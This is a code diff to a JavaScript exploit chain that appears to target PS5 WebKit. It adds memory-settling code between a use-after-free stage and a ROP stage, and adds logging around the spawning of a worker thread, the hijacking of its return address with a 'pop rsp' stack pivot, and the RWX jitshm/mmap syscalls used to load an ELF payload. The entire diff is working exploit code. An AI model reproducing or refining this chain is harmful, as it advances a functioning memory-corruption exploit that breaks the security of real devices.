@@ -818,6 +818,24 @@ async function runWebKitUAF(onProgress) {
     });
 }
 
+async function settleMemoryBeforeROP(ms = 800) {
+    // mem.js already calls releaseFakeCell() at PAIR-RELEASE, which drops the
+    // 9,000,000-slot carrier (~72 MB), the 512 x 64 KB drain (~32 MB) and the
+    // 65k filler graph. But dropping a reference is not reclaiming it: JSC
+    // frees on its own schedule, and the very next thing the ROP stage does is
+    // spawn a Worker -- a whole new thread with its own heap. If the WebProcess
+    // is still sitting on ~100 MB of garbage at that moment, that spawn is what
+    // tips it into "not enough system memory space".
+    let gced = false;
+    try {
+        if (typeof globalThis.gc === "function") { globalThis.gc(); gced = true; }
+    } catch (e) { /* not exposed on PS5 WebKit; the yield below is all we get */ }
+    const rounds = 8;
+    for (let i = 0; i < rounds; i++) await sleep(ms / rounds);
+    log(`memory settled for ${ms}ms before the ROP stage `
+        + `(explicit gc: ${gced ? "yes" : "not exposed"})`, "log-info");
+}
+
 async function initROP() {
     let p = exploitState.p || window.p || globalThis.p;
     if (!p) throw new Error("No primitive");
@@ -1032,8 +1050,10 @@ async function initROP() {
         const noReturn = !!(opts && opts.noReturn);
 
         if (!ropWorker) {
+            log("ROP: spawning rop_slave worker (new thread + heap)...", "log-info");
             ropWorker = new Worker("slopkit-main/slopkit/rop_slave.js?v=ktech2");
             await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
+            log("ROP: worker primed and idle", "log-info");
         }
 
         if (!ropReturnSlot) {
@@ -1044,6 +1064,7 @@ async function initROP() {
                 if (stacksz.low == 0x80000) { ropWorkerStack = stack; break; }
             }
             if (!ropWorkerStack) throw new Error("worker stack not found");
+            log(`ROP: worker stack 0x${ropWorkerStack.toString()}`, "log-info");
 
             ropReturnSlot = await new Promise((resolve, reject) => {
                 const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
@@ -1063,6 +1084,7 @@ async function initROP() {
 
         let return_address_ptr = ropReturnSlot;
         let stack_pointer_ptr = return_address_ptr.add32(0x8);
+        log(`ROP: return slot 0x${return_address_ptr.toString()}`, "log-info");
 
         if (!noReturn) {
             let original_return_address = p.read8(return_address_ptr);
@@ -1076,8 +1098,12 @@ async function initROP() {
         }
 
         if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
+        log(`ROP: pivoting rsp to 0x${c.stack_entry_point.toString()} `
+            + `(${c.count} qwords) and waking the worker...`, "log-info");
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         p.write8(stack_pointer_ptr, c.stack_entry_point);
+        if (!noReturn)
+            log("ROP: pivot written; chain now executing on the hijacked thread", "log-info");
 
         if (noReturn) {
             // This thread now lives inside the payload; never reuse it.
@@ -1087,6 +1113,7 @@ async function initROP() {
             return;
         }
         await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
+        log("ROP: chain finished, worker replied (longjmp restore OK)", "log-info");
     }});
 
     exploitState.chain = chain;
@@ -1167,10 +1194,10 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
     // MAP_PRIVATE|MAP_ANONYMOUS with fd = -1, which always returns -1 -- and it
     // then went on to write 397 KB of ELF at 0xffffffffffffffff, which is what
     // ended in "not enough memory space".
+    log(`entering first ROP syscall: jitshm_create(0, 0x${imageSize.toString(16)}, PROT_RWX)`, "log-info");
     const jitFd = await chain.syscall_int32(SYS_JITSHM_CREATE, 0, imageSize, PROT_RWX);
     if (!(jitFd >= 0)) throw new Error(`jitshm_create(0x215) failed: fd=${jitFd}`);
     log(`jitshm_create -> fd ${jitFd} (0x${imageSize.toString(16)} bytes, PROT_RWX)`, "log-ok");
-
     const mapped = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RWX, MAP_SHARED, jitFd, 0);
     if ((mapped.low >>> 0) === 0xFFFFFFFF && (mapped.hi >>> 0) === 0xFFFFFFFF)
         throw new Error("mmap(PROT_RWX, MAP_SHARED, jitshm fd) returned -1");
@@ -1301,6 +1328,10 @@ async function runFullExploitChain() {
     try {
         await runWebKitUAF((detail) => { progress.textContent = detail; });
         exploitState.webkitExploited = true;
+
+        // The exploit graphs are released at PAIR-RELEASE but not yet
+        // reclaimed; give JSC room before the ROP stage spawns its worker.
+        await settleMemoryBeforeROP();
 
         exploitState.stage = "primitive";
         updateStageBadge("primitive");
